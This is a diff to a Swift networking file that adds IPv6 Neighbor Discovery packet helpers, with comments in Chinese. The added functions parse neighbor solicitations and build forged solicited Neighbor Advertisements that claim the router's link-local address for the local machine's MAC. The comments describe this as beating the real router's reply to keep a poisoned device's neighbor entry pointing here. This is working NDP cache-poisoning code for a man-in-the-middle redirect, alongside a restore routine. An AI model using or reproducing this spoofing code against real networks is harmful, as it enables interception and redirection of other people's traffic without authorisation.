@@ -81,6 +81,62 @@ public enum NDPPacket {
                               flags: flagRouter | flagOverride)
     }
 
+    // MARK: - 被动抢答设备 NS（Neighbor Solicitation, type 135）
+
+    /// 设备被投毒后，其网关邻居条目老化时会发 NUD **单播** NS 来复核可达性——目的正是本机 MAC
+    /// （它缓存的「路由器 LL 在本机」），所以非混杂也收得到。抢在真路由器前回一条 solicited NA，
+    /// 就能把条目从 STALE 直接翻成 REACHABLE、继续压在本机上。这是「唤醒沿」抢答的核心。
+    ///
+    /// 判据：以太类型 IPv6、next-header ICMPv6(58，NDP 无扩展头)、ICMPv6 type 135。
+    /// 最短 78 字节 = 以太(14) + IPv6(40) + NS(8 头 + 16 target)。
+    public static func isNeighborSolicitation(_ frame: [UInt8]) -> Bool {
+        guard frame.count >= 78 else { return false }
+        guard frame[12] == 0x86, frame[13] == 0xDD else { return false }
+        guard frame[20] == 58 else { return false }   // IPv6 next header = ICMPv6
+        return frame[54] == 135                        // ICMPv6 type = NS
+    }
+
+    /// NS 的 target 地址（要复核的那个地址）。偏移 = 以太(14) + IPv6(40) + NS头(8) = 62。
+    public static func nsTarget(_ frame: [UInt8]) -> [UInt8]? {
+        guard isNeighborSolicitation(frame) else { return nil }
+        return Array(frame[62..<78])
+    }
+
+    /// 帧的 IPv6 源地址（NS 发起者的地址，抢答 NA 要单播回它）。`::`（DAD 阶段的 NS）返回 nil
+    /// —— 无法单播回一个未指定地址，那种 NS 交给真路由器处理。
+    public static func ipv6Source(_ frame: [UInt8]) -> [UInt8]? {
+        guard frame.count >= 38 else { return nil }
+        let src = Array(frame[22..<38])
+        return src.allSatisfy { $0 == 0 } ? nil : src
+    }
+
+    /// 帧的以太源 MAC（NS 发起者的 MAC）。
+    public static func ethSource(_ frame: [UInt8]) -> [UInt8]? {
+        guard frame.count >= 12 else { return nil }
+        return Array(frame[6..<12])
+    }
+
+    /// 抢答设备 NS 的 **solicited** NA：单播回设备、target = 路由器 LL、TLLA = 本机 MAC，
+    /// 标志 Router|Solicited|Override（solicited 单播合法，直接把条目翻成 REACHABLE）。
+    public static func solicitedNA(deviceMAC: ARPPacket.MAC, selfMAC: ARPPacket.MAC,
+                                   deviceIP6: [UInt8], routerLL6: [UInt8]) -> [UInt8] {
+        neighborAdvertisement(ethDst: deviceMAC, ethSrc: selfMAC,
+                              srcIP6: routerLL6, dstIP6: deviceIP6,
+                              targetIP6: routerLL6, tlla: selfMAC,
+                              flags: flagRouter | flagSolicited | flagOverride)
+    }
+
+    /// **单播 solicited** 复原 NA：已知设备 LL 时用它把条目更强地翻回真路由器 MAC（比组播复原更快
+    /// 落到 REACHABLE）。抢答过设备 NS 就会记下它的 LL（见 `Redirector`），复原时优先走这条。
+    public static func restoreUnicast(deviceMAC: ARPPacket.MAC, selfMAC: ARPPacket.MAC,
+                                      deviceIP6: [UInt8], routerLL6: [UInt8],
+                                      routerMAC6: ARPPacket.MAC) -> [UInt8] {
+        neighborAdvertisement(ethDst: deviceMAC, ethSrc: selfMAC,
+                              srcIP6: routerLL6, dstIP6: deviceIP6,
+                              targetIP6: routerLL6, tlla: routerMAC6,
+                              flags: flagRouter | flagSolicited | flagOverride)
+    }
+
     // MARK: - 底层帧构造
 
     /// 拼一帧完整的以太 + IPv6 + ICMPv6 Neighbor Advertisement(type 136)。
